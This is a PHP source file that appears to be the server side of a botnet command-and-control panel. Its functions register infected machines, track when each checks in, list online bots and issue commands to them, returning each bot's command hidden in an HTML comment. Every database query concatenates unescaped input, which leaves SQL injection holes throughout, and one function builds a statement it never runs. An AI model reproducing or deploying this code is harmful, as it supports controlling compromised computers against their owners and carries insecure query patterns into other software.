<?php

function SetBotCommand($sql, $command){
	$b00l = mysql_query("UPDATE bots SET Command='" . $command . "  " . "' WHERE " . $sql) or die(mysql_error());
	return $b00l;
}

function NewBots() {
	$query=mysql_query("SELECT ID FROM bots WHERE date='" . date('d') . '.' . date('m') . '.' . date('y') . "'") or die(mysql_error());
	echo mysql_num_rows($query);
}


function SetStandartCommand($command) {
	$sql = "ALTER TABLE `bots` CHANGE `Command` `Command` VARCHAR(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL DEFAULT " . $command;
}

function ShowAllBots($timeout) {
	$query = mysql_query("SELECT ID,Date,Command,Login FROM bots") or die(mysql_error());
	echo("<br />Total bots: " . mysql_num_rows($query) . "<br /><br /><br />");
	while($data=mysql_fetch_array($query)){
		$b00lONLINE=' style="background-color:#FF0000"';
		$timestamp=explode(" ", microtime());
		if ($data[Login] + $timeout > $timestamp[1]){
			$b00lONLINE=' style="background-color:#00FF00"';
		}
		echo '<table border=1.5>';
		/*echo "<input type='checkbox'
		 name='$bots[]'
		 value='$data[id]'";*/
		echo '<tr ' . $b00lONLINE . '><td>' . $data['ID'] . '</td><td>' . $data['Date'] . '</td><td>' . $data['Command'] . '</td>\n</tr>\n</table>'; 
	}

}

function IsBotInDB($serial, $name) {  
	$query = mysql_query("SELECT ID FROM bots WHERE Serial='" . $serial . "' AND name='" . $name . "'") or die(mysql_error());
	$row = mysql_fetch_array($query,MYSQL_ASSOC);
	if (!empty($row['ID'])) {
		return TRUE;
	}
}

function GetBotID($serial, $name) {       
	$query = mysql_query("SELECT ID FROM bots WHERE Serial='" . $serial . "' AND name='" . $name . "'") or die(mysql_error());
	$row = mysql_fetch_array($query, MYSQL_ASSOC);
	return $row['ID'];       
}

function GetBotCmd($ID){
	$sql="SELECT Command FROM bots WHERE ID='" . $ID . "'";  
	$query = mysql_query($sql) or die(mysql_error());
	$row = mysql_fetch_array($query, MYSQL_ASSOC);
	echo '<!--' . $row['Command'] . '-->' . '!wait';
}

function AddBotToDB($serial,$name) {
	$timestamp = explode(" ", microtime());
	$country_code = 'HAX';
	$query = mysql_query("INSERT INTO bots (ID,Serial,name,Command,Date,Login) VALUES(NULL, '" . $serial . "', '" . $name. "', NULL, '" . date('d') . '.' . date('m') . '.' . date('y') . "', '" . $timestamp[1] . "');") or die(mysql_error());
}

function SetLoginDate($id){
	$timestamp=explode(" ", microtime());
	$query=mysql_query("UPDATE bots SET Login=" . $timestamp[1] . " WHERE ID='" . $id . "'") or die(mysql_error());
}

?>